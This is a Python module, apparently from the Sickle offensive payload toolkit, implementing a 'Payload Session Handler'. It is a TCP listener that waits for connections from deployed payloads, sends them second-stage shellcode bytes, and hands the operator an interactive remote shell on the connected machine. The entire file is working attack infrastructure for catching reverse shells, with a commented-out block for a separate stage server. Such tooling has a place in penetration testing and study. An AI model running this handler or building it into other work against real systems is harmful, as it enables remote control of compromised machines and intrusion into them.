import os
import sys
import time
import socket
import threading
import socketserver

from sickle.common.lib.generic import modparser

time_start = time.time()

class TCPStageHandler(socketserver.StreamRequestHandler):

    def handle(self):

        log_print(f"Sending stage ({len(self.server.stage)}) to {self.client_address[0]}")
        self.request.sendall(self.server.stage)

class SimpleTTYHandler(socketserver.StreamRequestHandler):

    def handle(self):

        log_print(f"Connection established with {self.client_address[0]}")

        if self.server.stage != None:
            log_print(f"Sending stage ({len(self.server.stage)}) to {self.client_address[0]}")
            self.request.sendall(self.server.stage)
            #self.request.shutdown(socket.SHUT_WR) 
        else:
            print("")

        while True:
            self.request.settimeout(0.1)

            response = b""
            while True:
                try:
                    data = self.request.recv(4096)
                except:
                    break

                response += data

            self.request.settimeout(30)

            shell_prompt = response.decode('latin-1')

            self.request.sendall(input(shell_prompt).encode('latin-1') + b'\n')



class Module():

    name = "Payload Session Handler"

    module = "handler"

    example_run = f"{sys.argv[0]} -m {module}"

    platform = "Multi"

    arch = "Multi"

    ring = 3

    author = ["wetw0rk"]

    tested_platforms = ["Linux", "Windows"]

    summary = ""

    description = ("")

    arguments = {}

    arguments["HANDLER"] = {}
    arguments["HANDLER"]["optional"] = "no"
    arguments["HANDLER"]["description"] = "Handler for incoming connections"
    arguments["HANDLER"]["options"] = { "tty": "Simple TTY handler similiar to netcat for capturing a shell" }

    arguments["SRVHOST"] = {}
    arguments["SRVHOST"]["optional"] = "yes"
    arguments["SRVHOST"]["description"] = "IP to bind handler to"
    
    arguments["SRVPORT"] = {}
    arguments["SRVPORT"]["optional"] = "yes"
    arguments["SRVPORT"]["description"] = "Port to bind handler to"

    arguments["STGPORT"] = {}
    arguments["STGPORT"]["optional"] = "yes"
    arguments["STGPORT"]["description"] = "Port that obtains connection to sends a second stage"

    def __init__(self, arg_object):
       
        self.arg_list  = arg_object["positional arguments"]
        self.stage     = arg_object["raw bytes"]

        self.set_args()

    def set_args(self):

        argv_dict = modparser.argument_check(Module.arguments, self.arg_list)
        if (argv_dict == None):
            exit(-1)

        self.handler = argv_dict["HANDLER"]

        if "SRVHOST" not in argv_dict.keys():
            self.srvhost = "0.0.0.0"
        else:
            self.srvhost = argv_dict["SRVHOST"]

        if "SRVPORT" not in argv_dict.keys():
            self.srvport = 4242
        else:
            self.srvport = int(argv_dict["SRVPORT"])

        if "STGPORT" in argv_dict.keys():
            self.stgport = int(argv_dict["STGPORT"])

    def do_thing(self):

        if self.handler == "tty":
            self.start_tty_handler()
        else:
            print(f"{self.handler} is not a valid handler")
            exit(-1)

    def start_tty_handler(self):

#        if self.stage != None:
#            stage_server = socketserver.TCPServer((self.srvhost, self.stgport), TCPStageHandler)
#            stage_server.stage = self.stage
#
#            server_thread = threading.Thread(target=stage_server.serve_forever)
#            server_thread.daemon = True
#            server_thread.start()
#
#            log_print(f"TCPStageHandler started on port {self.srvhost}:{self.stgport}")

        log_print(f"SimpleTTYHandler started on {self.srvhost}:{self.srvport}")
        server = socketserver.TCPServer((self.srvhost, self.srvport), SimpleTTYHandler)
        server.stage = self.stage
        server.serve_forever()

def log_print(msg):
        
    elapsed = time.time() - time_start
    print(f"[{elapsed:8.6f}] {msg}")
    
    return
